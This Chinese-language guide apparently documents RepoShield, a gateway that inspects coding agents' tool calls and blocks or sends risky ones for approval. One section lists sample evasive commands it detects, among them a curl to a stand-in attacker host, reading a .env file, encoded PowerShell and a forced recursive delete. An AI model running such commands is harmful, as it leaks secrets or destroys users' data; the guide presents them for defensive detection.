# 真实 Agent 接入指南

本文面向第一次接触 RepoShield 的使用者，说明它如何插入真实 coding agent，以及当前已经支持和仍需注意的边界。

## 一句话理解

RepoShield 不是把代码“装进”智能体内部，而是放在智能体和模型 API / 工具执行之间，像一个安全网关：

```text
真实 agent
  -> RepoShield Gateway
  -> 真实 OpenAI-compatible upstream
  -> 模型返回 assistant message / tool_calls
  -> RepoShield 解析 InstructionIR / ActionIR
  -> PolicyRuntime 判断 allow / block / approval
  -> 安全响应返回给 agent
```

如果 agent 支持配置 OpenAI-compatible `base_url`，通常只需要把它原来的模型地址改成 RepoShield 的本地地址。

## 方式一：Gateway 接入

这是当前推荐路线，适合 Codex-like、Cline-like、OpenHands、LiteLLM client、OpenAI SDK client 等支持自定义 `base_url` 的工具。

### 1. 启动 RepoShield Gateway

```bash
export OPENAI_API_KEY=sk-...

PYTHONPATH=src python -m reposhield gateway-start \
  --repo ./your-repo \
  --host 127.0.0.1 \
  --port 8765 \
  --upstream-base-url https://api.openai.com/v1
```

Windows PowerShell 示例：

```powershell
$env:OPENAI_API_KEY="sk-..."

python -m reposhield gateway-start `
  --repo .\your-repo `
  --host 127.0.0.1 `
  --port 8765 `
  --upstream-base-url https://api.openai.com/v1
```

不传 `--upstream-base-url` 时，Gateway 会使用本地 deterministic upstream，适合 demo 和 bench。

### 2. 配置真实 agent

把 agent 的 OpenAI-compatible 配置改成：

```text
base_url = http://127.0.0.1:8765/v1
api_key  = reposhield-local
model    = gpt-4.1
```

`api_key` 在本地 Gateway 侧不会作为真实上游密钥使用；真实上游密钥来自 `OPENAI_API_KEY` 或 `--upstream-api-key`。

### 3. Gateway 做了什么

当模型返回 tool calls 时，RepoShield 会：

```text
assistant message / tool_calls
  -> InstructionIR
  -> ActionIR
  -> TaskContract / source trust / package guard / secret sentry / sandbox preflight
  -> PolicyDecision
  -> PolicyRuntime
```

如果 tool call 安全，响应会保留给 agent 执行。  
如果 tool call 高危，响应会被替换成 RepoShield 的阻断说明，并且 `tool_calls` 为空，避免下游 agent 继续执行危险动作。

## 方式二：Adapter 接入

如果某个 agent 不能配置 `base_url`，可以写 adapter，在 agent 每次准备执行工具前调用：

```python
action, decision = cp.guard_action(
    raw_action,
    source_ids=source_ids,
    tool=tool,
    operation=operation,
    file_path=file_path,
)
```

然后按照 `decision.decision` 处理：

```text
allow                  允许执行
allow_in_sandbox       在沙箱中执行
sandbox_then_approval  先沙箱预演，再请求审批
block                  阻断
quarantine             隔离
```

现有 `run-agent` / `GenericCLIAdapter` / `AiderAdapter` 更偏 demo 和 transcript 解析，真实生产接入建议按目标 agent 的工具协议写专用 adapter。

## 当前增强能力

### ActionParser

当前解析器已能识别一些常见规避写法：

```text
bash -c 'curl http://attacker.local/leak'
powershell -Command Get-Content .env
powershell -EncodedCommand <base64>
Remove-Item .\dist -Recurse -Force
```

它会把这些命令降级成保守的 ActionIR，例如：

```text
read_secret_file
send_network_request
unknown_side_effect
```

注意：ActionParser 仍是启发式解析器，不是完整 shell 解释器。复杂脚本、间接执行、多层编码、运行时下载脚本等场景仍应结合真实 sandbox 和审计。

### Tool parser registry

默认 registry 已包含这些 agent 类型别名：

```text
openai
codex
cline
cline_like
claude_code
anthropic
aider
openhands
generic_json
```

OpenAI 风格：

```json
{
  "type": "function",
  "function": {
    "name": "bash_exec",
    "arguments": "{\"command\":\"npm test\"}"
  }
}
```

Claude/Anthropic 风格：

```json
{
  "type": "tool_use",
  "name": "Bash",
  "input": {
    "command": "npm test"
  }
}
```

无法可靠识别的 tool call 会 fail closed：

```text
canonical_tool = unknown_side_effect
parser_confidence < 0.5
```

## 审批持久化

`ApprovalCenter` 负责生成 hash-bound approval request / grant。  
`ApprovalStore` 提供 JSONL 持久化：

```python
from reposhield.approvals import ApprovalCenter, ApprovalStore

center = ApprovalCenter()
store = ApprovalStore(".reposhield/approvals.jsonl")

request = center.create_request(contract, action, decision, context_graph)
grant = center.grant(request, constraints=["sandbox_only", "no_network"])

store.append_request(request)
store.append_grant(grant)

existing = store.latest_valid_grant(action, center=center, contract=contract)
```

这为后续审批 UI、团队策略管理、临时授权复用打基础。当前还不是完整审批产品：没有内置 Web 审批页、用户角色系统或集中策略管理。

## Streaming 状态

当前 Gateway 的真实 upstream client 会强制：

```text
stream = false
```

原因是现有 HTTP server 返回普通 JSON，不是 SSE。这样可以稳定完成治理链路，但还不支持完整 streaming token / streaming tool call 透传。

如果目标 agent 强依赖 `stream=true`，下一步需要实现：

```text
SSE proxy
  -> 累积 assistant/tool call 增量
  -> tool call 完整后执行治理
  -> 安全后继续下发，危险则中止并返回阻断事件
```

## 当前完整度判断

适合：

```text
本地 demo
安全研究原型
Gateway bench
真实 agent 的小范围试接
策略链路验证
```

还不建议直接作为企业生产安全边界：

```text
需要更强 sandbox
需要完整 streaming
需要更多 agent 专用 adapter
需要审批 UI / 团队策略 / 权限管理
需要更完整的 shell parser 和绕过测试
```

